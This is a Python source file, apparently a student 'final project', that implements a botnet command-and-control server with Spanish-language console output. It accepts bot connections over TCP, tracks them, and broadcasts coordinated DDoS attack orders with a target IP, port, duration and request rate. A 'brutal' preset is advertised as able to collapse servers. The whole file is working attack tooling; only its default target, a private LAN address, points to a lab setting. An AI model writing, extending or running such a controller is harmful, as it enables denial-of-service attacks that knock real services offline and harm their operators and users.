#!/usr/bin/env python3
"""
🎮 MAESTRO TERMINAL - BONITO Y FUNCIONAL
Sin web, solo terminal épica
"""

import socket
import threading
import time
import json
from datetime import datetime
import os
import sys

# Colores para terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class BotNetMaster:
    def __init__(self, port=9999):
        self.port = port
        self.bots = {}  # {bot_id: {socket, ip, connected_at}}
        self.attacks = []
        self.lock = threading.Lock()
        self.running = True
        
    def print_banner(self):
        """Banner épico"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Colors.BOLD}{Colors.PURPLE}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║    🤖 {Colors.CYAN}BOTNET MASTER - PROYECTO FINAL{Colors.PURPLE} 🤖       ║
║                                                          ║
║    {Colors.YELLOW}🎯 Control de Ataques DDoS Coordinados{Colors.PURPLE}      ║
║    {Colors.GREEN}🔗 Puerto: {self.port} | Protocolo: TCP{Colors.PURPLE}            ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(banner)
        
    def log(self, message, level="INFO"):
        """Log con colores"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "ATTACK": Colors.PURPLE,
            "BOT": Colors.BLUE
        }
        
        color = colors.get(level, Colors.WHITE)
        emoji = {
            "INFO": "📡",
            "SUCCESS": "✅",
            "WARNING": "⚠️",
            "ERROR": "❌",
            "ATTACK": "🔥",
            "BOT": "🤖"
        }.get(level, "ℹ️")
        
        print(f"{color}[{timestamp}] {emoji} {message}{Colors.END}")
    
    def handle_bot(self, client_sock, addr):
        """Maneja conexión de un bot"""
        bot_id = f"BOT_{addr[0].replace('.', '_')}_{int(time.time()) % 1000}"
        
        try:
            # Registrar bot
            with self.lock:
                self.bots[bot_id] = {
                    'socket': client_sock,
                    'ip': addr[0],
                    'port': addr[1],
                    'connected_at': time.time(),
                    'last_seen': time.time()
                }
            
            self.log(f"Bot conectado: {Colors.BOLD}{bot_id}{Colors.END} desde {addr[0]}", "BOT")
            client_sock.send(f"HELLO|{bot_id}|MASTER_OK\n".encode())
            
            # Escuchar mensajes del bot
            while self.running:
                try:
                    data = client_sock.recv(1024).decode().strip()
                    if not data:
                        break
                    
                    if data == "PING":
                        client_sock.send(b"PONG\n")
                    elif data.startswith("REPORT|"):
                        self.log(f"{bot_id}: {data[7:]}", "INFO")
                    
                    # Actualizar último visto
                    with self.lock:
                        if bot_id in self.bots:
                            self.bots[bot_id]['last_seen'] = time.time()
                            
                except socket.timeout:
                    continue
                except:
                    break
                    
        except Exception as e:
            self.log(f"Error con bot {bot_id}: {str(e)[:50]}", "ERROR")
        finally:
            with self.lock:
                if bot_id in self.bots:
                    del self.bots[bot_id]
            client_sock.close()
            self.log(f"Bot desconectado: {bot_id}", "WARNING")
    
    def send_attack_command(self, target_ip, target_port, duration=30, intensity=100):
        """Envía comando de ataque a TODOS los bots"""
        attack_id = int(time.time())
        
        with self.lock:
            if not self.bots:
                self.log("No hay bots conectados para atacar!", "ERROR")
                return 0
            
            bot_count = len(self.bots)
            self.log(f"{Colors.BOLD}🚀 INICIANDO ATAQUE COORDINADO DDoS{Colors.END}", "ATTACK")
            self.log(f"🎯 Objetivo: {Colors.BOLD}{target_ip}:{target_port}{Colors.END}", "ATTACK")
            self.log(f"⏱️  Duración: {duration} segundos", "ATTACK")
            self.log(f"💥 Intensidad: {intensity} RPS por bot", "ATTACK")
            self.log(f"🤖 Ejército: {bot_count} bots listos", "ATTACK")
            
            # Preparar comando BRUTAL
            command = f"ATTACK|{target_ip}|{target_port}|{duration}|{intensity}|BRUTAL\n"
            
            # Enviar a todos los bots
            disconnected = []
            for bot_id, bot_info in self.bots.items():
                try:
                    bot_info['socket'].send(command.encode())
                    self.log(f"  ⚡ Orden enviada a {bot_id}", "SUCCESS")
                except:
                    disconnected.append(bot_id)
            
            # Limpiar desconectados
            for bot_id in disconnected:
                del self.bots[bot_id]
            
            # Registrar ataque
            self.attacks.append({
                'id': attack_id,
                'target': f"{target_ip}:{target_port}",
                'duration': duration,
                'bots': bot_count - len(disconnected),
                'timestamp': datetime.now().isoformat()
            })
        
        return bot_count
    
    def show_bots(self):
        """Muestra bots conectados en tabla bonita"""
        with self.lock:
            if not self.bots:
                print(f"\n{Colors.YELLOW}╔══════════════════════════════════════╗")
                print(f"║     ⚠️  NO HAY BOTS CONECTADOS     ║")
                print(f"╚══════════════════════════════════════╝{Colors.END}")
                return
            
            print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════╗")
            print(f"║                🤖 EJÉRCITO DE BOTS ({len(self.bots)})             ║")
            print(f"╠══════════════════════════════════════════════════════╣{Colors.END}")
            
            for i, (bot_id, bot_info) in enumerate(self.bots.items()):
                uptime = int(time.time() - bot_info['connected_at'])
                last_seen = int(time.time() - bot_info['last_seen'])
                
                status = f"{Colors.GREEN}● ONLINE{Colors.END}" if last_seen < 10 else f"{Colors.YELLOW}○ IDLE{Colors.END}"
                
                print(f"{Colors.WHITE}  [{i+1:02d}] {Colors.BOLD}{bot_id}{Colors.END}")
                print(f"       IP: {bot_info['ip']:<15} | Uptime: {uptime:<4}s")
                print(f"       Status: {status} | Last seen: {last_seen}s ago")
                print(f"       {Colors.WHITE}{'─'*50}{Colors.END}")
            
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════╝{Colors.END}")
    
    def show_attacks(self):
        """Muestra historial de ataques"""
        if not self.attacks:
            print(f"\n{Colors.YELLOW}No hay ataques registrados{Colors.END}")
            return
        
        print(f"\n{Colors.PURPLE}╔══════════════════════════════════════════════════════╗")
        print(f"║                📜 HISTORIAL DE ATAQUES               ║")
        print(f"╠══════════════════════════════════════════════════════╣{Colors.END}")
        
        for attack in self.attacks[-5:]:  # Últimos 5 ataques
            time_str = datetime.fromisoformat(attack['timestamp']).strftime("%H:%M:%S")
            print(f"{Colors.WHITE}  🎯 {attack['target']}")
            print(f"     ⏱️  {attack['duration']}s | 🤖 {attack['bots']} bots")
            print(f"     🕒 {time_str}")
            print(f"     {Colors.WHITE}{'─'*45}{Colors.END}")
        
        print(f"{Colors.PURPLE}╚══════════════════════════════════════════════════════╝{Colors.END}")
    
    def start_server(self):
        """Inicia el servidor maestro"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.port))
        server.listen(5)
        
        self.print_banner()
        self.log(f"Servidor iniciado en puerto {self.port}", "SUCCESS")
        
        # Mostrar IPs disponibles
        import socket as sock
        hostname = sock.gethostname()
        local_ip = sock.gethostbyname(hostname)
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}📡 IPs DISPONIBLES PARA BOTS:{Colors.END}")
        print(f"  {Colors.GREEN}• {local_ip}:{self.port}{Colors.END}")
        for ip in sock.gethostbyname_ex(hostname)[2]:
            if ip != local_ip and (ip.startswith("192.168.") or ip.startswith("10.")):
                print(f"  {Colors.GREEN}• {ip}:{self.port}{Colors.END}")
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}🚀 Esperando conexiones de bots...{Colors.END}")
        
        # Hilo para aceptar conexiones
        def accept_connections():
            while self.running:
                try:
                    client, addr = server.accept()
                    client.settimeout(30)
                    threading.Thread(
                        target=self.handle_bot,
                        args=(client, addr),
                        daemon=True
                    ).start()
                except:
                    break
        
        accept_thread = threading.Thread(target=accept_connections, daemon=True)
        accept_thread.start()
        
        # Consola interactiva
        self.command_console()
        
        # Limpiar
        self.running = False
        server.close()
    
    def command_console(self):
        """Consola de comandos interactiva"""
        while self.running:
            try:
                print(f"\n{Colors.BOLD}{Colors.WHITE}╔══════════════════ {Colors.CYAN}COMANDOS{Colors.WHITE} ═══════════════════╗")
                print(f"║                                                  ║")
                print(f"║  {Colors.GREEN}list{Colors.WHITE}     - Ver bots conectados                ║")
                print(f"║  {Colors.RED}attack{Colors.WHITE}   - Iniciar ataque DDoS                ║")
                print(f"║  {Colors.YELLOW}history{Colors.WHITE}  - Ver historial de ataques           ║")
                print(f"║  {Colors.PURPLE}brutal{Colors.WHITE}   - Ataque BRUTAL (recomendado)        ║")
                print(f"║  {Colors.CYAN}test{Colors.WHITE}     - Prueba rápida (5s)                 ║")
                print(f"║  {Colors.WHITE}clear{Colors.WHITE}    - Limpiar pantalla                   ║")
                print(f"║  {Colors.RED}exit{Colors.WHITE}     - Salir                            ║")
                print(f"║                                                  ║")
                print(f"╚══════════════════════════════════════════════════╝{Colors.END}")
                
                cmd = input(f"\n{Colors.BOLD}{Colors.CYAN}botnet>{Colors.END} ").strip().lower()
                
                if cmd == "list":
                    self.show_bots()
                    
                elif cmd == "attack":
                    self.attack_wizard()
                    
                elif cmd == "brutal":
                    self.brutal_attack()
                    
                elif cmd == "history":
                    self.show_attacks()
                    
                elif cmd == "test":
                    self.send_attack_command("192.168.1.100", 8080, 5, 50)
                    
                elif cmd == "clear":
                    self.print_banner()
                    
                elif cmd == "exit":
                    self.log("Cerrando servidor maestro...", "WARNING")
                    break
                    
                else:
                    print(f"{Colors.RED}Comando desconocido: {cmd}{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}\n⚠️  Interrupción recibida.{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
    
    def attack_wizard(self):
        """Asistente para configurar ataque"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}🎯 CONFIGURACIÓN DE ATAQUE DDoS{Colors.END}")
        print(f"{Colors.WHITE}{'─'*50}{Colors.END}")
        
        target = input(f"{Colors.CYAN}IP objetivo [{Colors.WHITE}192.168.1.100{Colors.CYAN}]:{Colors.END} ").strip()
        target = target if target else "192.168.1.100"
        
        port = input(f"{Colors.CYAN}Puerto [{Colors.WHITE}8080{Colors.CYAN}]:{Colors.END} ").strip()
        port = int(port) if port else 8080
        
        duration = input(f"{Colors.CYAN}Duración (segundos) [{Colors.WHITE}30{Colors.CYAN}]:{Colors.END} ").strip()
        duration = int(duration) if duration else 30
        
        intensity = input(f"{Colors.CYAN}Intensidad RPS/bot [{Colors.WHITE}100{Colors.CYAN}]:{Colors.END} ").strip()
        intensity = int(intensity) if intensity else 100
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}⚠️  CONFIRMAR ATAQUE:{Colors.END}")
        print(f"  {Colors.WHITE}🎯 Objetivo: {Colors.BOLD}{target}:{port}{Colors.END}")
        print(f"  {Colors.WHITE}⏱️  Duración: {Colors.BOLD}{duration}s{Colors.END}")
        print(f"  {Colors.WHITE}💥 Intensidad: {Colors.BOLD}{intensity} RPS por bot{Colors.END}")
        
        with self.lock:
            bot_count = len(self.bots)
            print(f"  {Colors.WHITE}🤖 Bots disponibles: {Colors.BOLD}{bot_count}{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}¿Ejecutar ataque? (s/N):{Colors.END} ").strip().lower()
        
        if confirm == 's':
            self.send_attack_command(target, port, duration, intensity)
        else:
            print(f"{Colors.YELLOW}Ataque cancelado.{Colors.END}")
    
    def brutal_attack(self):
        """Ataque brutal preconfigurado"""
        print(f"\n{Colors.BOLD}{Colors.RED}💀 ATAQUE BRUTAL - SATURACIÓN GARANTIZADA{Colors.END}")
        print(f"{Colors.WHITE}Configuración recomendada para colapsar servidores{Colors.END}")
        
        target = "192.168.1.100"
        port = 8080
        duration = 20
        intensity = 200  # BRUTAL
        
        with self.lock:
            bot_count = len(self.bots)
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}CONFIGURACIÓN BRUTAL:{Colors.END}")
        print(f"  {Colors.WHITE}🎯 {target}:{port}")
        print(f"  {Colors.WHITE}⏱️  {duration} segundos")
        print(f"  {Colors.WHITE}💥 {intensity} RPS por bot")
        print(f"  {Colors.WHITE}🤖 {bot_count} bots")
        print(f"  {Colors.WHITE}⚡ Total estimado: {bot_count * intensity * duration:,} requests{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}¿LANZAR ATAQUE BRUTAL? (s/N):{Colors.END} ").strip().lower()
        
        if confirm == 's':
            self.send_attack_command(target, port, duration, intensity)
            print(f"{Colors.GREEN}🔥 ¡ATAQUE BRUTAL INICIADO!{Colors.END}")
            print(f"{Colors.YELLOW}Monitorea los logs del servidor víctima.{Colors.END}")
        else:
            print(f"{Colors.YELLOW}Ataque brutal cancelado.{Colors.END}")

def main():
    """Función principal"""
    try:
        master = BotNetMaster(port=9999)
        master.start_server()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Programa terminado.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error fatal: {e}{Colors.END}")

if __name__ == "__main__":
    main()
